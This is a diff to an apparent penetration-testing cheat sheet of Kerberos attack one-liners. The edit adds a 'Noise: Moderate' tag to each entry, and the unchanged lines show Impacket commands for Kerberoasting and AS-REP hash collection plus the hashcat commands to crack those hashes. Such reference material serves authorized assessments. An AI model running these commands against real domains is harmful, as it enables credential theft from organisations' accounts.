@@ -8,7 +8,7 @@ Hash collection and offline testing one-liners for Kerberos assessments.
 GetUserSPNs.py <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP> -request -outputfile kerberoast.txt
 ```
 
-**Tool:** Impacket · **Platform:** Linux · **Tags:** Kerberos, Hashes · **Context:** User
+**Tool:** Impacket · **Platform:** Linux · **Tags:** Kerberos, Hashes · **Context:** User · **Noise:** Moderate
 
 ### AS-REP hashes
 
@@ -16,7 +16,7 @@ GetUserSPNs.py <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP> -request -outputfile ke
 GetNPUsers.py <DOMAIN>/ -dc-ip <DC_IP> -usersfile users.txt -no-pass -format hashcat -outputfile asrep.txt
 ```
 
-**Tool:** Impacket · **Platform:** Linux · **Tags:** Kerberos, Hashes · **Context:** User
+**Tool:** Impacket · **Platform:** Linux · **Tags:** Kerberos, Hashes · **Context:** User · **Noise:** Moderate
 
 ### Hashcat Kerberoast
 
@@ -24,7 +24,7 @@ GetNPUsers.py <DOMAIN>/ -dc-ip <DC_IP> -usersfile users.txt -no-pass -format has
 hashcat -m 13100 kerberoast.txt <WORDLIST>
 ```
 
-**Tool:** Hashcat · **Platform:** Linux/Windows · **Tags:** Kerberoast, Cracking · **Context:** User
+**Tool:** Hashcat · **Platform:** Linux/Windows · **Tags:** Kerberoast, Cracking · **Context:** User · **Noise:** Moderate
 
 ### Hashcat AS-REP
 
@@ -32,7 +32,7 @@ hashcat -m 13100 kerberoast.txt <WORDLIST>
 hashcat -m 18200 asrep.txt <WORDLIST>
 ```
 
-**Tool:** Hashcat · **Platform:** Linux/Windows · **Tags:** AS-REP, Cracking · **Context:** User
+**Tool:** Hashcat · **Platform:** Linux/Windows · **Tags:** AS-REP, Cracking · **Context:** User · **Noise:** Moderate
 
 ---
 
